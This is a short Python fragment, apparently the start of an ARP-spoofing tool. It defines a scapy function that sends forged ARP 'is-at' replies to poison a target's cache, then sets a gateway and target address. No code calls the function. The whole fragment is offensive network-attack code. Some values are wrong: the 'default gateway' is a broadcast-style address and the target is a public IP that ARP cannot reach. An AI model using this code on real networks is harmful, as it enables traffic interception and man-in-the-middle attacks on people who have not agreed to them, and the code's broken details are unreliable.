import scapy.all as scapy

def spoof(target_ip, target_mac, spoof_ip):
    ARP_packet = scapy.ARP(pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, op = "is-at")
    scapy.send(ARP_packet)

default_gateway = "192.168.137.255"
target_ip = "213.57.182.162"
